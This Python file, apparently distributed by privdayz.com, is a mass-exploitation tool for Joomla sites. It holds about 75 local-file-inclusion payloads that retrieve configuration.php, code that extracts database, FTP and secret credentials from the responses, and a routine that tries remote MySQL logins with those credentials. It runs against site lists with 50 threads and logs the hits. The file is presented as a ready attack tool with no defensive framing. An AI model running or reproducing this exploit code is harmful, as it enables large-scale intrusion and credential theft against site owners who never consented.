###############################################
#  JOOMLA MASS LFI SCANNER                   #
#  coded by privdayz.com                     #
###############################################

import requests
import threading
import os
import re
import sys
import urllib3
import pymysql
import socket
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

OUTPUT_FILE = "results_joomla.txt"
SUCCESS_FILE = "success_joomla.txt"

DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
}

log_lock = threading.Lock()

class ExploitResult:
    def __init__(self, site, exploit_name, exploit_type, status, info):
        self.site = site
        self.exploit_name = exploit_name
        self.exploit_type = exploit_type
        self.status = status
        self.info = info
    def __str__(self):
        return f"{self.site} | {self.exploit_name} | {self.exploit_type} | {self.status} | {self.info}"

def log_result(result):
    with log_lock:
        with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
            f.write(str(result) + "\n")
def log_success_only(result):
    if result.status == "VULNERABLE":
        with log_lock:
            with open(SUCCESS_FILE, "a", encoding="utf-8") as f:
                f.write(str(result) + "\n")

DEFAULT_LFI_PATHS = [
    "/plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA=",
    "/index.php?option=com_jssupportticket&c=ticket&task=downloadbyname&id=0&name=../../../configuration.php",
    "/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php",
    "/index.php?option=com_cckjseblod&task=download&file=configuration.php",
    "/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php",
    "/components/com_docman/dl2.php?archive=0&file=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA",
    "/index.php?option=com_addressbook&controller=../../../configuration.php%00",
    "/index.php?option=com_multimap&controller=../../../configuration.php%00",
    "/index.php?option=com_zimbcore&controller=../../../configuration.php%00",
    "/index.php?option=com_rwcards&view=rwcards&controller=../../../configuration.php%00",
    "/index.php?option=com_delicious&controller=../../../configuration.php%00",
    "/index.php?option=com_rsappt_pro2&view=../../../configuration.php%00",
    "/index.php?option=com_event&view=../../../../../../../../configuration.php%00",
    "/index.php?option=com_multiroot&controller=../../../configuration.php%00",
    "/index.php?option=com_ticketbook&controller=../../../configuration.php%00",
    "/index.php?option=com_jprojectmanager&controller=../../../configuration.php%00",
    "/index.php?option=com_jajobboard&view=../../../configuration.php%00",
    "/index.php?option=com_matamko&controller=../../../configuration.php%00",
    "/index.php?option=com_mmsblog&controller=../../../configuration.php%00",
    "/index.php?option=com_drawroot&controller=../../../configuration.php%00",
    "/index.php?option=com_jotloader&section=../../../configuration.php%00",
    "/index.php?option=com_cbe&task=userProfile&user=23&ajaxdirekt=true&tabname=../../../configuration.php%00",
    "/index.php?option=com_hsconfig&controller=../../../configuration.php%00",
    "/index.php?option=com_jfeedback&controller=../../../configuration.php%00",
    "/index.php?option=com_worldrates&controller=../../../configuration.php%00",
    "/index.php?option=com_photobattle&view=../../../configuration.php%00",
    "/index.php?option=com_memory&controller=../../../configuration.php%00",
    "/index.php?option=com_powermail&controller=../../../configuration.php%00",
    "/index.php?option=com_acooldebate&controller=../../../configuration.php%00",
    "/index.php?option=com_horoscope&controller=../../../configuration.php%00",
    "/index.php?option=com_jimtawl&Itemid=12&task=../../../../../../../../configuration.php%00",
    "/index.php?option=com_awdwall&controller=../../../configuration.php%00",
    "/index.php?option=com_wgpicasa&controller=../../../configuration.php%00",
    "/index.php?option=com_zimbcomment&controller=../../../configuration.php%00",
    "/index.php?option=com_linkr&controller=../../../configuration.php%00",
    "/index.php?option=com_s5clanroster&view=../../../configuration.php%00",
    "/index.php?option=com_people&controller=../../../../../../../../../../../configuration.php%00",
    "/index.php?option=com_pc&controller=.../../../configuration.php%00",
    "/plugins/system/captcha/playcode.php?lng=../../../configuration.php%00%00",
    "/index.php?option=com_arcadegames&controller=../../../configuration.php%00",
    "/index.php?option=com_jwhmcs&controller=../../../configuration.php%00",
    "/index.php?option=com_aardvertiser&cat_name=conf&task=../../../configuration.php%00",
    "/index.php?option=com_abbrev&controller=../../../configuration.php%00",
    "/index.php?option=com_orgchart&controller=../../../configuration.php%00",
    "/index.php?option=com_news_portal&controller=../../../configuration.php%00",
    "/index.php?option=com_record&controller=../../../configuration.php%00",
    "/index.php?option=com_juliaportfolio&controller=../../../configuration.php%00",
    "/index.php?option=com_sebercart&view=../../../configuration.php%00",
    "/index.php?option=com_myfiles&controller=../../../configuration.php%00",
    "/index.php?option=com_lovefactory&controller=../../../configuration.php%00",
    "/index.php?option=com_communitypolls&controller=../../../../../../../../configuration.php%00",
    "/index.php?option=com_ganalytics&controller=../../../configuration.php%00",
    "/index.php?option=com_sectionex&controller=../../../configuration.php%00",
    "/index.php?option=com_blogfactory&controller=../../../configuration.php%00",
    "/index.php?option=com_connect&view=connect&controller=../../../configuration.php%00",
    "/index.php?option=com_joomlaflickr&controller=../../../configuration.php%00",
    "/index.php?option=com_mtfireeagle&controller=../../../configuration.php%00",
    "/index.php?option=com_joommail&controller=../../../configuration.php%00",
    "/components/com_xgallery/helpers/img.php?file=../../../configuration.php%00",
    "/index.php?option=com_shohada&controller=../../../configuration.php%00",
    "index.php?option=com_bit&controller=../../../configuration.php%000",
    "/index.php?option=com_ztautolink&controller=../../../configuration.php%00",
    "/index.php?option=com_p2dxt&controller=../../../configuration.php%00",
    "/mambots/editors/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=../../../configuration.php%00",
    "/index.php?option=com_xvs&controller=../../../configuration.php%00",
    "/index.php?com_invest&controller=../../../configuration.php%00",
    "/index.php?option=com_visa&controller=../../../configuration.php%00",
    "/index.php?option=com_rule&amp;controller=../../../configuration.php%00",
    "/index.php?option=com_sadnews&amp;controller=../../../configuration.php%00",
    "/index.php?option=com_fundhelp&controller=../../../configuration.php%00",
    "/index.php?option=com_bch&controller=../../../configuration.php%00",
    "/index.php?option=com_autographbook&controller=../../../configuration.php%00",
    "/index.php?option=com_funnynews&controller=../../../configuration.php%00",
]

# --- Remote MySQL Connection Tester ---
def test_remote_mysql(host, user, password, dbname, port=3306, timeout=5):
    try:
        conn = pymysql.connect(
            host=host,
            user=user,
            password=password,
            database=dbname,
            port=port,
            connect_timeout=timeout,
            read_timeout=timeout,
            write_timeout=timeout
        )
        conn.close()
        return True
    except Exception:
        return False

# --- Public IP Resolver ---
def resolve_public_ip(site_url):
    domain = site_url.replace("http://", "").replace("https://", "").split("/")[0]
    try:
        ip = socket.gethostbyname(domain)
        return ip
    except Exception:
        return None

# --- Joomla Config Credential Extractor ---
def extract_joomla_creds(config_text):
    def get(key, regex=None):
        if not regex:
            regex = r"\${0}\s*=\s*['\"]([^'\"]+)['\"]".format(key)
        match = re.search(regex, config_text)
        return match.group(1).strip() if match else '-'
    creds = {
        'db_user': get('user', r"\$user\s*=\s*['\"]([^'\"]+)['\"]"),
        'db_pass': get('password', r"\$password\s*=\s*['\"]([^'\"]+)['\"]"),
        'db_name': get('db', r"\$db\s*=\s*['\"]([^'\"]+)['\"]"),
        'db_host': get('host', r"\$host\s*=\s*['\"]([^'\"]+)['\"]"),
        'ftp_host': get('ftp_host'),
        'ftp_user': get('ftp_user'),
        'ftp_pass': get('ftp_pass'),
        'secret':   get('secret'),
    }
    return creds

# --- Main LFI Exploit Logic ---
def exploit_lfi_multi(site, extra={}):
    exploit_name = "Joomla LFI Multi-Path"
    exploit_type = "lfi"
    site = site.rstrip('/')
    paths = DEFAULT_LFI_PATHS.copy()
    paths.extend(extra.get("paths", []))
    for path in paths:
        url = urljoin(site, path)
        try:
            r = requests.get(url, headers=DEFAULT_HEADERS, timeout=10, verify=False)
            if r.status_code == 200 and ("class JConfig" in r.text or "$user" in r.text or "$db" in r.text):
                creds = extract_joomla_creds(r.text)
                info_line = "|".join([f"{k}:{v}" for k, v in creds.items()])
                # --- Remote DB Checker ---
                dbhost = creds['db_host']
                dbuser = creds['db_user']
                dbpass = creds['db_pass']
                dbname = creds['db_name']
                remotedb_result = "-"
                if dbhost and dbuser and dbpass and dbname:
                    if dbhost in ["localhost", "127.0.0.1"]:
                        public_ip = resolve_public_ip(site)
                        if public_ip:
                            remotedb_result = "YES" if test_remote_mysql(public_ip, dbuser, dbpass, dbname) else "NO"
                    else:
                        remotedb_result = "YES" if test_remote_mysql(dbhost, dbuser, dbpass, dbname) else "NO"
                print(f"[+] {site} | {exploit_name} | {exploit_type} | VULNERABLE | {url} | {info_line} | REMOTEDB:{remotedb_result}")
                return ExploitResult(site, exploit_name, exploit_type, "VULNERABLE", f"{url} | {info_line} | REMOTEDB:{remotedb_result}")
        except Exception:
            continue
    print(f"[-] {site} | {exploit_name} | {exploit_type} | NOT VULN | -")
    return ExploitResult(site, exploit_name, exploit_type, "NOT VULN", "-")

#################################################################
# --- Exploit Pool ---  |  coded by privdayz.com | stay curious #
#################################################################

LFI_EXPLOITS = [
    exploit_lfi_multi
]

# --- Main Thread Worker ---
def scan_site(site, mode, extra={}):
    site = site.strip()
    if not site:
        return
    if mode == "lfi":
        for exploit_func in LFI_EXPLOITS:
            result = exploit_func(site, extra)
            print(result)
            log_result(result)
            log_success_only(result)
    else:
        print(f"[!] Unknown exploit category: {mode}")

def main():
    if len(sys.argv) < 3:
        print("\n[+] Joomla Mass LFI Scanner by privdayz.com")
        print("Usage : python joomscan.py <category> <sites.txt | single-site>")
        print("Example: python joomscan.py lfi sites.txt")
        print("Example: python joomscan.py lfi http://target.com")
        exit()
    mode = sys.argv[1].lower()
    site_input = sys.argv[2]
    extra = {}
    if os.path.exists(site_input):
        with open(site_input, "r", encoding="utf-8") as f:
            sites = [x.strip() for x in f if x.strip()]
    else:
        sites = [site_input]
    THREADS = 50
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = [executor.submit(scan_site, site, mode, extra) for site in sites]
        for future in as_completed(futures):
            pass

if __name__ == "__main__":
    # Hack the planet! coded by privdayz.com
    main()
